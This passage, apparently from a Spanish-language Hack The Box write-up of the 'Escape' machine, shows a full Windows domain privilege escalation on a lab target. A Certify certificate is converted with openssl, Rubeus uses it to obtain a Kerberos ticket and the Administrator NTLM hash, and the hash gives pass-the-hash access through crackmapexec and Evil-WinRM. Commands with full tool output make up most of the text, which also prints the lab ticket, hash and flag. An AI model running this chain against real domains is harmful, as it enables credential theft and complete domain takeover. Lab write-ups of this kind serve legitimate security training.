CdhgLD+68udOCKFadQuZkrFe5NL1s2BqvaAB7m4CrE7DzultO4G+sKqSOnpLTL8h
eG14vBeODFqMSNkL0t9fKVKdEyTd556o6ZjiIK0OHDvfNGTgAMhz9zVFCUiH8SCS
kBd1jJo+2lgOQ4ZZLZCHD+xc6ID2vz/4V3Ai0VF7x+qcfwsRQ+MYFHYgEkb8U9EB
3/iKlbHRj+m5djKjsxyCxE5CYbDAPQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.1953287
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Al final nos esta diciendo que usemos `openssl`

Ahora haremos este paso

![](/assets/images/htb-writeup-escape/5.png)

Tenemos que guardar la `key` y el `certificado`

```bash
❯ openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Ahora subimos el archivo `cert.pfx` que nos creo 

Y tambien el `Rubeus` como nos indican en los pasos <https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/>

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload cert.pfx
Info: Uploading cert.pfx to C:\Users\Ryan.Cooper\Documents\cert.pfx

                                                             
Data: 4376 bytes of 4376 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload Rubeus.exe
Info: Uploading Rubeus.exe to C:\Users\Ryan.Cooper\Documents\Rubeus.exe

                                                             
Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Ahora con `Rubeus` le vamos a pasar el `cert.pfx` y con /getcredentials nos muestra el hash ntlm del Administrator

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::f4cd:3765:b742:9c10%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  2/26/2023 7:14:55 PM
  EndTime                  :  2/27/2023 5:14:55 AM
  RenewTill                :  3/5/2023 7:14:55 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MvdPwGwD+q3E5ER5S0/tqw==
  ASREP (key)              :  80FBFA5CDBE815E701B0061CE091FBD1

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Tenemos su hash `A52F78E4C751E5F5E17E1E9F3E58F4EE`

Es correcto

```bash
❯ crackmapexec winrm 10.129.163.81 -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
SMB         10.129.163.81   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.129.163.81   5985   DC               [*] http://10.129.163.81:5985/wsman
WINRM       10.129.163.81   5985   DC               [+] sequel.htb\Administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE (Pwn3d!)
```

```bash
❯ evil-winrm -i 10.129.163.81 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

## Root.txt

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/26/2023   2:55 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
afae8fed409a547b2dd3dacf186b404c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```




